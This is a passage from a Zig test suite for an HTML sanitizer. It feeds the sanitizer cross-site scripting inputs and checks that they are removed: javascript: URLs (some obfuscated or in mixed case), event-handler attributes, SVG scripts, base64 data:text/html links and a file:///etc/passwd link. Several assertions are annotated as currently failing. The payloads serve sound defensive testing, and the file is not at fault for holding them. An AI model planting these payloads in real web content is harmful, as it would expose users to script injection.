            .allow_custom_elements = true,
            .allow_framework_attrs = true,
            .sanitize_dom_clobbering = true,
            .allow_embeds = true, // Enable embed validation instead of removal
        },
    });
    const result = try z.innerHTML(allocator, z.bodyElement(doc).?);
    defer allocator.free(result);

    try testing.expect(std.mem.indexOf(u8, result, "document.pdf") != null);
    try testing.expect(std.mem.indexOf(u8, result, "video.mp4") != null);
    try testing.expect(std.mem.indexOf(u8, result, "image.png") != null);

    // Dangerous content should be removed
    try testing.expect(std.mem.indexOf(u8, result, "javascript:") == null);
    try testing.expect(std.mem.indexOf(u8, result, "data:text/html") == null);
    try testing.expect(std.mem.indexOf(u8, result, "x-shockwave-flash") == null);
}

test "object and embed with safe types in permissive mode" {
    const allocator = testing.allocator;
    const html =
        \\<body>
        \\<object data="https://example.com/document.pdf" type="application/pdf">
        \\</object>
        \\<!-- A comment -->
        \\<embed src="https://example.com/image.png" type="image/png">
        \\<object data="https://example.com/video.mp4" type="video/mp4">
        \\</object>
        \\<embed src="https://example.com/audio.mp3" type="audio/mpeg">
        \\</body>
    ;

    const doc = try z.parseHTML(allocator, html);
    defer z.destroyDocument(doc);

    // Use custom mode that allows objects/embeds (allow_embeds=true enables validation)
    try sanitizeWithMode(allocator, z.bodyNode(doc).?, .{
        .custom = SanitizerOptions{
            .skip_comments = true,
            .remove_scripts = true,
            .remove_styles = true,
            .strict_uri_validation = true,
            .allow_custom_elements = false,
            .allow_embeds = true, // Enable embed validation instead of removal
        },
    });

    const result = try z.innerHTML(allocator, z.bodyElement(doc).?);
    defer allocator.free(result);

    // Should keep safe media objects/embeds
    try testing.expect(std.mem.indexOf(u8, result, "document.pdf") != null);
    try testing.expect(std.mem.indexOf(u8, result, "image.png") != null);
    try testing.expect(std.mem.indexOf(u8, result, "video.mp4") != null);
    try testing.expect(std.mem.indexOf(u8, result, "audio.mp3") != null);
    try testing.expect(std.mem.indexOf(u8, result, "A comment") == null);
}

test "svg element safety" {
    const allocator = testing.allocator;
    const html =
        \\<body>
        \\<svg viewBox="0 0 100 100">
        \\  <circle cx="50" cy="50" r="40" fill="blue"/>
        \\  <script>alert('svg xss')</script>
        \\  <foreignObject width="100" height="100">
        \\    <div xmlns="http://www.w3.org/1999/xhtml">Evil HTML</div>
        \\  </foreignObject>
        \\  <animate attributeName="opacity" onbegin="alert()" values="0;1"/>
        \\  <a xlink:href="javascript:alert()">
        \\    <text x="10" y="20">Click me</text>
        \\  </a>
        \\  <a href="https://example.com">
        \\    <text x="10" y="40">Safe link</text>
        \\  </a>
        \\  <use xlink:href="external.svg#icon"/>
        \\  <image href="external.png"/>
        \\  <text x="50" y="50">Safe text</text>
        \\  <rect x="0" y="0" width="10" height="10"/>
        \\</svg>
        \\</body>
    ;

    const doc = try z.parseHTML(allocator, html);
    defer z.destroyDocument(doc);

    try sanitizeStrict(allocator, z.bodyNode(doc).?);
    const result = try z.innerHTML(allocator, z.bodyElement(doc).?);
    defer allocator.free(result);

    // Should remove dangerous SVG elements
    try testing.expect(std.mem.indexOf(u8, result, "<script>") == null);
    try testing.expect(std.mem.indexOf(u8, result, "foreignObject") == null);
    try testing.expect(std.mem.indexOf(u8, result, "onbegin") == null);
    try testing.expect(std.mem.indexOf(u8, result, "javascript:") == null);
    try testing.expect(std.mem.indexOf(u8, result, "<animate") == null);

    // SVG <a> elements are blocked (can contain javascript: URLs)
    try testing.expect(std.mem.indexOf(u8, result, "<a ") == null);
    try testing.expect(std.mem.indexOf(u8, result, "<a>") == null);

    // SVG <use> elements are blocked (external resource loading / XSS)
    try testing.expect(std.mem.indexOf(u8, result, "<use") == null);

    // SVG <image> elements are blocked (external resource loading / SSRF)
    try testing.expect(std.mem.indexOf(u8, result, "<image") == null);

    // Should keep safe SVG content
    try testing.expect(std.mem.indexOf(u8, result, "<svg") != null);
    try testing.expect(std.mem.indexOf(u8, result, "<circle") != null);
    try testing.expect(std.mem.indexOf(u8, result, "<rect") != null);
    try testing.expect(std.mem.indexOf(u8, result, "<text") != null);
    try testing.expect(std.mem.indexOf(u8, result, "Safe text") != null);
}

test "form element safety" {
    const allocator = testing.allocator;
    const html =
        \\<body>
        \\<form action="https://example.com/submit" method="POST">
        \\  <input type="text" name="username" value="test">
        \\  <input type="password" name="password">
        \\  <input type="submit" value="Submit" onclick="alert()">
        \\  <textarea name="message">Hello</textarea>
        \\  <button type="button" onmouseover="evil()">Click</button>
        \\</form>
        \\<form action="javascript:alert()" method="GET">
        \\  <input type="text" name="q">
        \\</form>
        \\</body>
    ;

    const doc = try z.parseHTML(allocator, html);
    defer z.destroyDocument(doc);

    try sanitizeStrict(allocator, z.bodyNode(doc).?);
    const result = try z.innerHTML(allocator, z.bodyElement(doc).?);
    defer allocator.free(result);

    // Should remove dangerous form attributes/actions
    try testing.expect(std.mem.indexOf(u8, result, "onclick") == null);
    try testing.expect(std.mem.indexOf(u8, result, "onmouseover") == null);
    try testing.expect(std.mem.indexOf(u8, result, "javascript:") == null);
    // Should keep safe form elements
    try testing.expect(std.mem.indexOf(u8, result, "<form") != null);
    try testing.expect(std.mem.indexOf(u8, result, "<input") != null);
    try testing.expect(std.mem.indexOf(u8, result, "<textarea") != null);
    try testing.expect(std.mem.indexOf(u8, result, "<button") != null);
    try testing.expect(std.mem.indexOf(u8, result, "https://example.com") != null);
}

test "link element safety" {
    const allocator = testing.allocator;
    const html =
        \\<body>
        \\<link rel="stylesheet" href="https://example.com/style.css">
        \\<link rel="icon" href="/favicon.ico">
        \\<link rel="stylesheet" href="javascript:alert()">
        \\<link rel="prefetch" href="https://cdn.example.com/resource">
        \\<link rel="alternate" type="application/rss+xml" href="/feed.xml">
        \\</body>
    ;

    const doc = try z.parseHTML(allocator, html);
    defer z.destroyDocument(doc);

    try sanitizeStrict(allocator, z.bodyNode(doc).?);
    const result = try z.innerHTML(allocator, z.bodyElement(doc).?);
    defer allocator.free(result);

    // Should remove dangerous links
    try testing.expect(std.mem.indexOf(u8, result, "javascript:") == null);
    // Should keep safe links (stylesheet, icon)
    try testing.expect(std.mem.indexOf(u8, result, "stylesheet") != null);
    try testing.expect(std.mem.indexOf(u8, result, "icon") != null);
    try testing.expect(std.mem.indexOf(u8, result, "https://example.com") != null);
    try testing.expect(std.mem.indexOf(u8, result, "/favicon.ico") != null);
}

test "unicode obfuscation" {
    const allocator = testing.allocator;
    const html =
        \\<body>
        \\<a href="jav&#x61;script:alert('xss')">Zero-width space</a>
        \\<a href="j&#x0A;avascript:alert(1)">Newline</a>
        \\<a href="ja&#x00;vascript:alert(1)">Null byte</a>
        \\<div on&#x63;lick="alert()">Obfuscated event</div>
        \\<script>alert('regular')</script>
        \\</body>
    ;

    const doc = try z.parseHTML(allocator, html);
    defer z.destroyDocument(doc);

    try sanitizeStrict(allocator, z.bodyNode(doc).?);
    const result = try z.innerHTML(allocator, z.bodyElement(doc).?);
    defer allocator.free(result);

    // Should catch obfuscated javascript: and event handlers
    try testing.expect(std.mem.indexOf(u8, result, "javascript:") == null);
    try testing.expect(std.mem.indexOf(u8, result, "onclick") == null);
    try testing.expect(std.mem.indexOf(u8, result, "<script>") == null);
}

test "case variation attacks" {
    const allocator = testing.allocator;
    const html =
        \\<body>
        \\<a href="JAVASCRIPT:alert(1)">Uppercase</a>
        \\<a href="JavaScript:alert(1)">Mixed case</a>
        \\<a href="jAvAsCrIpT:alert(1)">Weird case</a>
        \\<div OnClIcK="alert()">Event mixed</div>
        \\<div ONLOAD="evil()">Event uppercase</div>
        \\<ScRiPt>alert(1)</ScRiPt>
        \\</body>
    ;

    const doc = try z.parseHTML(allocator, html);
    defer z.destroyDocument(doc);

    try sanitizeStrict(allocator, z.bodyNode(doc).?);
    const result = try z.innerHTML(allocator, z.bodyElement(doc).?);
    defer allocator.free(result);

    // Case-insensitive matching should catch all variants
    try testing.expect(std.mem.indexOf(u8, result, "javascript:") == null);
    try testing.expect(std.mem.indexOf(u8, result, "onclick") == null);
    try testing.expect(std.mem.indexOf(u8, result, "onload") == null);
    try testing.expect(std.mem.indexOf(u8, result, "<script") == null);
}

test "extremely nested elements" {
    const allocator = testing.allocator;

    // Create deeply nested structure
    var html_buf: std.ArrayList(u8) = .empty;
    defer html_buf.deinit(allocator);

    var depth: usize = 0;
    while (depth < 100) : (depth += 1) {
        try html_buf.writer(allocator).print("<div onclick=\"alert({})\">", .{depth});
    }

    try html_buf.appendSlice(allocator, "Deep content");

    depth = 0;
    while (depth < 100) : (depth += 1) {
        try html_buf.appendSlice(allocator, "</div>");
    }

    const doc = try z.parseHTML(allocator, html_buf.items);
    defer z.destroyDocument(doc);

    // Should handle deep nesting without stack overflow
    try sanitizeStrict(allocator, z.bodyNode(doc).?);
    const result = try z.innerHTML(allocator, z.bodyElement(doc).?);
    defer allocator.free(result);

    // All onclick handlers should be removed
    try testing.expect(std.mem.indexOf(u8, result, "onclick") == null);
    // Structure should remain
    try testing.expect(std.mem.indexOf(u8, result, "Deep content") != null);
}

test "large number of attributes" {
    const allocator = testing.allocator;

    var html_buf: std.ArrayList(u8) = .empty;
    defer html_buf.deinit(allocator);

    try html_buf.appendSlice(allocator, "<div");

    // Add many attributes (some dangerous, some safe)
    var i: usize = 0;
    while (i < 50) : (i += 1) {
        if (i % 5 == 0) {
            try html_buf.writer(allocator).print(" onclick=\"alert({})\"", .{i});
        } else {
            try html_buf.writer(allocator).print(" data-attr{}=\"value{}\"", .{ i, i });
        }
    }

    try html_buf.appendSlice(allocator, ">Content</div>");
    const doc = try z.parseHTML(allocator, html_buf.items);
    defer z.destroyDocument(doc);

    try sanitizeStrict(allocator, z.bodyNode(doc).?);
    const result = try z.innerHTML(allocator, z.bodyElement(doc).?);
    defer allocator.free(result);

    // All onclick handlers should be removed
    try testing.expect(std.mem.indexOf(u8, result, "onclick") == null);
    // data-* attributes should remain
    // try testing.expect(std.mem.indexOf(u8, result, "data-attr") != null);
    try testing.expect(std.mem.indexOf(u8, result, "Content") != null);
}

test "malformed HTML handling" {
    const allocator = testing.allocator;
    const html =
        \\<div>Unclosed div
        \\<script>alert('xss')</script
        \\<a href="javascript:alert()">Link
        \\<img src=x onerror=alert(1)>
        \\<div onclick="alert()">Content</div>
    ;

    const doc = try z.parseHTML(allocator, html);
    defer z.destroyDocument(doc);

    // Should not crash on malformed HTML
    try sanitizeStrict(allocator, z.bodyNode(doc).?);
    const result = try z.innerHTML(allocator, z.bodyElement(doc).?);
    defer allocator.free(result);

    // Should still sanitize dangerous content
    try testing.expect(std.mem.indexOf(u8, result, "<script>") == null);
    try testing.expect(std.mem.indexOf(u8, result, "javascript:") == null);
    try testing.expect(std.mem.indexOf(u8, result, "onerror") == null);
    try testing.expect(std.mem.indexOf(u8, result, "onclick") == null);
}

test "idempotnent sanitization" {
    const allocator = testing.allocator;
    const html =
        \\<div onclick="alert(1)" class="test">
        \\  <span hx-get="/api">Click</span>
        \\  <script>console.log('test')</script>
        \\</div>
    ;

    const doc = try z.parseHTML(allocator, html);
    defer z.destroyDocument(doc);
    const body = z.bodyNode(doc).?;

    // Sanitize multiple times (should be idempotent)
    try sanitizeStrict(allocator, body);
    const result1 = try z.innerHTML(allocator, z.bodyElement(doc).?);
    defer allocator.free(result1);

    // Sanitize again
    try sanitizeStrict(allocator, body);
    const result2 = try z.innerHTML(allocator, z.bodyElement(doc).?);
    defer allocator.free(result2);

    // Results should be identical (idempotent)
    try testing.expectEqualStrings(result1, result2);

    // Verify dangerous content is gone
    try testing.expect(std.mem.indexOf(u8, result1, "onclick") == null);
    try testing.expect(std.mem.indexOf(u8, result1, "<script>") == null);
    try testing.expect(std.mem.indexOf(u8, result1, "hx-get") == null); // <-- error
    try testing.expect(std.mem.indexOf(u8, result1, "class=\"test\"") != null);
    try testing.expect(std.mem.indexOf(u8, result1, "Click") != null);
}

test "large document performance" {
    const allocator = testing.allocator;

    // Generate a large HTML document
    var html_buf: std.ArrayList(u8) = .empty;
    defer html_buf.deinit(allocator);

    const writer = html_buf.writer(allocator);

    try writer.writeAll("<div>\n");

    var i: usize = 0;
    while (i < 1000) : (i += 1) {
        if (i % 10 == 0) {
            // Every 10th element has dangerous content
            try writer.print(
                \\  <p onclick="alert({})" class="paragraph" data-id="{}">
                \\    Dangerous paragraph {}
                \\  </p>
                \\
            , .{ i, i, i });
        } else {
            // Safe elements
            try writer.print(
                \\  <p class="paragraph" data-id="{}">
                \\    Safe paragraph {}
                \\  </p>
                \\
            , .{ i, i });
        }

        // Add some nested structure occasionally
        if (i % 50 == 0) {
            try writer.writeAll("  <div>\n");
            var j: usize = 0;
            while (j < 10) : (j += 1) {
                try writer.print("    <span>Nested {}-{}</span>\n", .{ i, j });
            }
            try writer.writeAll("  </div>\n");
        }
    }

    try writer.writeAll("</div>\n");

    const start_time = std.time.milliTimestamp();

    const doc = try z.parseHTML(allocator, html_buf.items);
    defer z.destroyDocument(doc);

    // Sanitize the large document
    try sanitizeStrict(allocator, z.bodyNode(doc).?);

    const end_time = std.time.milliTimestamp();
    const elapsed = end_time - start_time;

    // std.debug.print("Large document sanitization took {} ms\n", .{elapsed});
    try testing.expect(elapsed < 100); // 100ms is generous for CI environments

    const result = try z.innerHTML(allocator, z.bodyElement(doc).?);
    defer allocator.free(result);

    // Verify sanitization worked
    try testing.expect(std.mem.indexOf(u8, result, "onclick") == null);
    try testing.expect(std.mem.indexOf(u8, result, "Safe paragraph") != null);
}

test "many small elements" {
    const allocator = testing.allocator;

    var html_buf: std.ArrayList(u8) = .empty;
    defer html_buf.deinit(allocator);

    const writer = html_buf.writer(allocator);

    // Create 5000 small elements
    var i: usize = 0;
    while (i < 5000) : (i += 1) {
        if (i % 100 == 0) {
            // Some elements with framework attributes
            try writer.print("<span hx-get=\"/api/{}\">HTMX {}</span>", .{ i, i });
        } else if (i % 100 == 50) {
            // Some dangerous elements
            try writer.print("<span onclick=\"alert({})\">Bad {}</span>", .{ i, i });
        } else {
            // Safe elements
            try writer.print("<span>Element {}</span>", .{i});
        }
    }

    const start_time = std.time.milliTimestamp();

    const doc = try z.parseHTML(allocator, html_buf.items);
    defer z.destroyDocument(doc);

    try sanitizePermissive(allocator, z.bodyNode(doc).?);

    const end_time = std.time.milliTimestamp();
    const elapsed = end_time - start_time;

    // std.debug.print("Many small elements took {} ms\n", .{elapsed});
    try testing.expect(elapsed < 20);

    const result = try z.innerHTML(allocator, z.bodyElement(doc).?);
    defer allocator.free(result);

    // Framework attributes should remain, onclick should be removed
    try testing.expect(std.mem.indexOf(u8, result, "hx-get") != null);
    try testing.expect(std.mem.indexOf(u8, result, "onclick") == null);
}

test "memory usage with large attributes" {
    const allocator = testing.allocator;

    // Create element with very large attribute values
    var html_buf: std.ArrayList(u8) = .empty;
    defer html_buf.deinit(allocator);

    const writer = html_buf.writer(allocator);

    try writer.writeAll("<div");

    // Add a very large data attribute
    try writer.writeAll(" data-large=\"");
    var i: usize = 0;
    while (i < 10000) : (i += 1) {
        try writer.writeAll("x");
    }
    try writer.writeAll("\"");

    // Add many attributes
    i = 0;
    while (i < 100) : (i += 1) {
        try writer.print(" attr{}=\"value{}\"", .{ i, i });
    }

    try writer.writeAll(">Content</div>");

    const doc = try z.parseHTML(allocator, html_buf.items);
    defer z.destroyDocument(doc);

    // Should handle without excessive memory usage
    try sanitizeStrict(allocator, z.bodyNode(doc).?);
    const result = try z.innerHTML(allocator, z.bodyElement(doc).?);
    defer allocator.free(result);

    // Large data attribute should be preserved
    // try testing.expect(std.mem.indexOf(u8, result, "data-large") != null); // <---
    try testing.expect(std.mem.indexOf(u8, result, "Content") != null);
}

test "debug empty style attribute" {
    const allocator = testing.allocator;
    const html = "<body><div style=\"\"></div></body>";

    const doc = try z.parseHTML(allocator, html);
    defer z.destroyDocument(doc);

    const div = try z.querySelector(allocator, doc, "div");

    // Check what validateStyle returns
    const style = z.getAttribute_zc(div.?, "style") orelse "";
    // std.debug.print("Style value: '{s}'\n", .{style});
    // std.debug.print("validateStyle('{s}'): {}\n", .{ style, z.validateStyle(style) });
    try std.testing.expect(z.validateStyle(style));

    // Check strict mode options
    // const strict_opts = z.SanitizerMode.get(.strict);
    // std.debug.print("Strict mode remove_styles: {}\n", .{strict_opts.remove_styles});

    try sanitizeStrict(allocator, z.bodyNode(doc).?);

    const result = try z.innerHTML(allocator, z.bodyElement(doc).?);
    defer allocator.free(result);

    // std.debug.print("Result: {s}\n", .{result});
    try std.testing.expect(std.mem.indexOf(u8, result, "style") == null);
}
test "empty and whitespace-only attributes" {
    const allocator = testing.allocator;
    const html =
        \\<div onclick="">Empty event</div>
        \\<a href="  ">Whitespace URL</a>
        \\<div style="">no styling</div>
        \\<input type="text" value="">
        \\<div class="  ">Whitespace class</div>
    ;

    const doc = try z.parseHTML(allocator, html);
    defer z.destroyDocument(doc);

    try sanitizeStrict(allocator, z.bodyNode(doc).?);
    const result = try z.innerHTML(allocator, z.bodyElement(doc).?);
    defer allocator.free(result);

    // Should remove empty dangerous attributes
    try testing.expect(std.mem.indexOf(u8, result, "onclick") == null);
    try testing.expect(std.mem.indexOf(u8, result, "style") == null); // <-- error
    // Safe empty attributes can remain
    try testing.expect(std.mem.indexOf(u8, result, "value=\"\"") != null);
    try testing.expect(std.mem.indexOf(u8, result, "class") != null);
}

test "template element sanitization" {
    const allocator = testing.allocator;
    const html =
        \\<body>
        \\</body>
        \\<template id="user-card">
        \\  <div class="card">
        \\    <script>alert('xss')</script>
        \\    <h3>{{name}}</h3>
        \\    <p onclick="track()">{{email}}</p>
        \\    <button phx-click="follow">Follow</button>
        \\  </div>
        \\</template>
        \\<div>Regular content</div>
        \\<template>
        \\  <a href="javascript:alert()">Bad link</a>
        \\  <span>Template 2</span>
        \\</template>
    ;

    const doc = try z.parseHTML(allocator, html);
    defer z.destroyDocument(doc);

    try sanitizePermissive(allocator, z.bodyNode(doc).?);
    const result = try z.innerHTML(allocator, z.bodyElement(doc).?);
    defer allocator.free(result);

    // Template content should be sanitized
    try testing.expect(std.mem.indexOf(u8, result, "<template") != null);
    try testing.expect(std.mem.indexOf(u8, result, "Regular content") != null);
    try testing.expect(std.mem.indexOf(u8, result, "<script>") == null);
    try testing.expect(std.mem.indexOf(u8, result, "onclick=") == null);
    try testing.expect(std.mem.indexOf(u8, result, "javascript:") == null);
    try testing.expect(std.mem.indexOf(u8, result, "phx-click") != null);
    try testing.expect(std.mem.indexOf(u8, result, "Template 2") != null);
}

test "end-to-end real-world example" {
    const allocator = testing.allocator;

    // Real-world blog post with mixed content
    const html =
        \\<body>
        \\<article class="blog-post">
        \\  <h1>My Blog Post</h1>
        \\  <script async src="https://platform.twitter.com/widgets.js"></script>
        \\  <p onclick="trackClick()">Published on <time datetime="2024-01-15">Jan 15, 2024</time></p>
        \\
        \\  <div class="content">
        \\    <p>Here's some <strong>important</strong> content.</p>
        \\    <custom-gallery data-images='["img1.jpg", "img2.jpg"]'></custom-gallery>
        \\
        \\    <div phx-click="loadMore" class="load-more">
        \\      Load more comments
        \\    </div>
        \\
        \\    <iframe sandbox src="https://www.youtube.com/embed/abc123"></iframe>
        \\
        \\    <form action="/comment" method="POST" onsubmit="validate()">
        \\      <textarea name="comment" placeholder="Add a comment..."></textarea>
        \\      <button type="submit" x-data="{disabled: false}" @click="submit">Post</button>
        \\    </form>
        \\
        \\    <a href="javascript:share()" class="share-button">Share</a>
        \\    <a href="https://example.com" rel="noopener" target="_blank">External link</a>
        \\  </div>
        \\
        \\  <style>
        \\    .blog-post { max-width: 800px; }
        \\    .load-more { background: url(javascript:track()); }
        \\  </style>
        \\
        \\  <!-- Google Analytics -->
        \\  <script>
        \\    ga('send', 'pageview');
        \\  </script>
        \\</article>
        \\</body>
    ;

    const doc = try z.parseHTML(allocator, html);
    defer z.destroyDocument(doc);

    // Use permissive mode for modern web app
    try sanitizePermissive(allocator, z.bodyNode(doc).?);
    const result = try z.innerHTML(allocator, z.bodyElement(doc).?);
    defer allocator.free(result);
    // try z.prettyPrint(allocator, z.bodyNode(doc).?);

    // Verify sanitization:

    // Removed:
    try testing.expect(std.mem.indexOf(u8, result, "<script>") == null);
    try testing.expect(std.mem.indexOf(u8, result, "onclick=") == null);
    try testing.expect(std.mem.indexOf(u8, result, "onsubmit=") == null);
    try testing.expect(std.mem.indexOf(u8, result, "javascript:") == null); // <--- fails
    try testing.expect(std.mem.indexOf(u8, result, "<style>") == null);
    try testing.expect(std.mem.indexOf(u8, result, "<!--") == null);

    // Preserved:
    try testing.expect(std.mem.indexOf(u8, result, "blog-post") != null);
    try testing.expect(std.mem.indexOf(u8, result, "custom-gallery") != null);
    try testing.expect(std.mem.indexOf(u8, result, "phx-click") != null);
    try testing.expect(std.mem.indexOf(u8, result, "x-data") != null);
    try testing.expect(std.mem.indexOf(u8, result, "@click") != null);
    try testing.expect(std.mem.indexOf(u8, result, "sandbox") != null); // <-- error
    try testing.expect(std.mem.indexOf(u8, result, "https://example.com") != null);
    try testing.expect(std.mem.indexOf(u8, result, "rel=\"noopener\"") != null);
    try testing.expect(std.mem.indexOf(u8, result, "My Blog Post") != null);
    try testing.expect(std.mem.indexOf(u8, result, "important") != null);
}
// --------

test "sanitizer handles many nested and sequential nodes to remove" {
    const allocator = testing.allocator;

    // 1. Create a deeply nested structure where parent and child must be removed
    // The sanitizer should remove the outer div (onclick), the p (onmouseover),
    // and the script. The reverse-order destruction is critical here.
    const nested_malicious = "<div onclick='alert(1)'><p onmouseover='alert(2)'><script>alert(3)</script><span>Safe</span></p></div>";

    // 2. Create a long sequence of nodes to remove (more than the old fixed-size buffer of 32)
    var many_malicious_sb: std.ArrayListUnmanaged(u8) = .empty;
    defer many_malicious_sb.deinit(allocator);
    const writer = many_malicious_sb.writer(allocator);
    try writer.print("<div>", .{});
    var i: usize = 0;
    while (i < 50) : (i += 1) {
        try writer.print("<script>var x = {};</script>", .{.{i}});
    }
    try writer.print("</div>", .{});
    const many_malicious = try many_malicious_sb.toOwnedSlice(allocator);
    defer allocator.free(many_malicious);

    // Run strict sanitization on the nested malicious HTML
    const doc1 = try z.parseHTMLUnsafe(allocator, nested_malicious, .strict);
    defer z.destroyDocument(doc1);
    // const body1 = z.bodyNode(doc1).?;
    // try z.prettyPrint(allocator, body1);
    // try z.sanitizeStrict(allocator, z.bodyNode(doc1).?);
    const result1 = try z.innerHTML(allocator, z.bodyElement(doc1).?);
    defer allocator.free(result1);

    // The dangerous attributes and script tag should be removed, but the structure remains.
    // The dangerous attributes (onclick, onmouseover) and script tag should be removed, but the structure remains.
    try testing.expectEqualStrings("<div><p><span>Safe</span></p></div>", result1);

    // Run strict sanitization on the HTML with many malicious nodes
    const doc2 = try z.parseHTML(allocator, many_malicious);
    defer z.destroyDocument(doc2);
    try z.sanitizeStrict(allocator, z.bodyNode(doc2).?);
    const result2 = try z.innerHTML(allocator, z.bodyElement(doc2).?);
    defer allocator.free(result2);

    // The outer div should remain, but all 50 script tags inside should be gone.
    try testing.expectEqualStrings("<div></div>", result2);
}

test "comprehensive sanitization modes" {
    const allocator = testing.allocator;

    // Comprehensive malicious HTML content covering all attack vectors
    const comprehensive_malicious_html =
        \\<div onclick="alert('xss')" style="background: url(javascript:alert('css'))">
        \\  <script>alert('xss')</script>
        \\  <!-- malicious comment with <script>alert('comment')</script> -->
        \\  <style>body { background: url(javascript:alert('css')); }</style>
        \\  <p onmouseover="steal_data()" class="safe-class">Safe text</p>
        \\  <a href="javascript:alert('href')" title="Bad link">Bad link</a>
        \\  <a href="https://example.com" class="link">Good link</a>
        \\  <img src="https://example.com/image.jpg" alt="Safe image" onerror="alert('img')">
        \\  <iframe src="evil.html">Unsafe iframe</iframe>
        \\  <iframe sandbox src="https://example.com">Safe iframe</iframe>
        \\  <svg viewBox="0 0 100 100" onclick="alert('svg-xss')">
        \\    <circle cx="50" cy="50" r="40" fill="blue"/>
        \\    <script>alert('svg-script')</script>
        \\    <foreignObject width="100" height="100">
        \\      <div xmlns="http://www.w3.org/1999/xhtml">Evil content</div>
        \\    </foreignObject>
        \\    <animate attributeName="opacity" values="0;1" dur="2s" onbegin="alert('animate')"/>
        \\    <path d="M10 10 L90 90" stroke="red"/>
        \\    <text x="50" y="50" href="javascript:alert('text')">SVG Text</text>
        \\  </svg>
        \\  <phoenix-component phx-click="increment" :if="show_component" onclick="alert('custom')">
        \\    Phoenix LiveView Component
        \\  </phoenix-component>
        \\  <my-button @click="handleClick" :disabled="isDisabled" class="btn">
        \\    Custom Button
        \\  </my-button>
        \\  <vue-component v-if="showProfile" data-user-id="123">Vue Component</vue-component>
        \\  <button disabled hidden onclick="alert('XSS')" phx-click="increment">Potentially dangerous</button>
        \\  <div data-time="{@current}"> The current value is: {@counter} </div>
        \\  <a href="http://example.org/results?search=<img src=x onerror=alert('hello')>">URL Escaped</a>
        \\  <img src="data:text/html,<script>alert('XSS')</script>" alt="escaped">
        \\  <a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=">Potential dangerous b64</a>
        \\  <a href="file:///etc/passwd">Dangerous Local file access</a>
        \\  <p> The <code>push()</code> method adds one or more elements to the end of an array</p>
        \\  <pre> <code>Node.clone();</code>
        \\ method creates a copy of an element</pre>
        \\  <pre>function dangerous() {
        \\    <script>alert('pre-script')</script>
        \\    return "formatted code";
        \\  }</pre>
        \\</div>
        \\<link href="/shared-assets/misc/link-element-example.css" rel="stylesheet">
        \\<template><script>alert('XSS');</script><li id="{}">Item-"{}"</li></template>
    ;

    // Test 1: .minimum mode (minimal sanitization - only truly dangerous content)
    {
        const doc = try z.parseHTML(allocator, comprehensive_malicious_html);
        defer z.destroyDocument(doc);
        const body = z.bodyNode(doc).?;

        try sanitizeWithMode(allocator, body, .minimum);

        const result = try z.outerNodeHTML(allocator, body);
        defer allocator.free(result);

        // Should preserve most content including scripts and custom elements
        try testing.expect(std.mem.indexOf(u8, result, "script") != null);
        try testing.expect(std.mem.indexOf(u8, result, "malicious comment") != null);
        try testing.expect(std.mem.indexOf(u8, result, "phoenix-component") != null);
        try testing.expect(std.mem.indexOf(u8, result, "my-button") != null);
        try testing.expect(std.mem.indexOf(u8, result, "vue-component") != null);

        // Should preserve pre/code elements and their text content
        try testing.expect(std.mem.indexOf(u8, result, "<pre") != null);
        try testing.expect(std.mem.indexOf(u8, result, "<code") != null);
        try testing.expect(std.mem.indexOf(u8, result, "Node.clone()") != null);
        try testing.expect(std.mem.indexOf(u8, result, "push()") != null);
        try testing.expect(std.mem.indexOf(u8, result, "function dangerous()") != null);
        // Note: onclick and javascript: URIs might still be filtered at parser level
    }

    // Test 2: .strict mode (no custom elements, remove all dangerous content)
    {
        const doc = try z.parseHTML(allocator, comprehensive_malicious_html);
        defer z.destroyDocument(doc);
        const body = z.bodyNode(doc).?;

        try sanitizeWithMode(allocator, body, .strict);

        // Minify to clean up empty text nodes
        const body_element = z.nodeToElement(body) orelse return;
        try z.minifyDOM(allocator, body_element);

        const result = try z.outerNodeHTML(allocator, body);
        defer allocator.free(result);

        // Should remove dangerous content
        try testing.expect(std.mem.indexOf(u8, result, "script") == null);
        try testing.expect(std.mem.indexOf(u8, result, "onclick") == null);
        try testing.expect(std.mem.indexOf(u8, result, "javascript:") == null);
        try testing.expect(std.mem.indexOf(u8, result, "malicious comment") == null);
        try testing.expect(std.mem.indexOf(u8, result, "foreignObject") == null);
        try testing.expect(std.mem.indexOf(u8, result, "animate") == null);

        // Should remove custom elements in strict mode
        try testing.expect(std.mem.indexOf(u8, result, "phoenix-component") == null);
        try testing.expect(std.mem.indexOf(u8, result, "my-button") == null);
        try testing.expect(std.mem.indexOf(u8, result, "vue-component") == null);

        // Should preserve safe content
        try testing.expect(std.mem.indexOf(u8, result, "Safe text") != null);
        try testing.expect(std.mem.indexOf(u8, result, "Good link") != null);
        try testing.expect(std.mem.indexOf(u8, result, "safe-class") != null);
        try testing.expect(std.mem.indexOf(u8, result, "https://example.com") != null);
        try testing.expect(std.mem.indexOf(u8, result, "<svg") != null);
        try testing.expect(std.mem.indexOf(u8, result, "<circle") != null);
        try testing.expect(std.mem.indexOf(u8, result, "SVG Text") != null);

        // Should preserve pre/code elements and text content but remove dangerous scripts inside them
        try testing.expect(std.mem.indexOf(u8, result, "<pre") != null);
        try testing.expect(std.mem.indexOf(u8, result, "<code") != null);
        try testing.expect(std.mem.indexOf(u8, result, "Node.clone()") != null);
        try testing.expect(std.mem.indexOf(u8, result, "push()") != null);
        try testing.expect(std.mem.indexOf(u8, result, "function dangerous()") != null);
        // But script tags inside pre should be removed
        try testing.expect(std.mem.indexOf(u8, result, "pre-script") == null);
    }

    // Test 3: .permissive mode (allow custom elements, still secure)
    {
        const doc = try z.parseHTML(allocator, comprehensive_malicious_html);
        defer z.destroyDocument(doc);
        const body = z.bodyNode(doc).?;

        try sanitizeWithMode(allocator, body, .permissive);

        const result = try z.outerNodeHTML(allocator, body);
        defer allocator.free(result);

        // Should still remove dangerous content
        try testing.expect(std.mem.indexOf(u8, result, "script") == null);
        try testing.expect(std.mem.indexOf(u8, result, "foreignObject") == null);
        try testing.expect(std.mem.indexOf(u8, result, "animate") == null);
        try testing.expect(std.mem.indexOf(u8, result, "javascript:") == null);

        // Should preserve custom elements and framework attributes
        try testing.expect(std.mem.indexOf(u8, result, "phoenix-component") != null);
        try testing.expect(std.mem.indexOf(u8, result, "my-button") != null);
        try testing.expect(std.mem.indexOf(u8, result, "vue-component") != null);
        try testing.expect(std.mem.indexOf(u8, result, "phx-click") != null);
        try testing.expect(std.mem.indexOf(u8, result, ":if") != null);
        try testing.expect(std.mem.indexOf(u8, result, "@click") != null);
        try testing.expect(std.mem.indexOf(u8, result, "v-if") != null);
        try testing.expect(std.mem.indexOf(u8, result, "data-user-id") != null);

        // Traditional onclick should still be removed even from custom elements
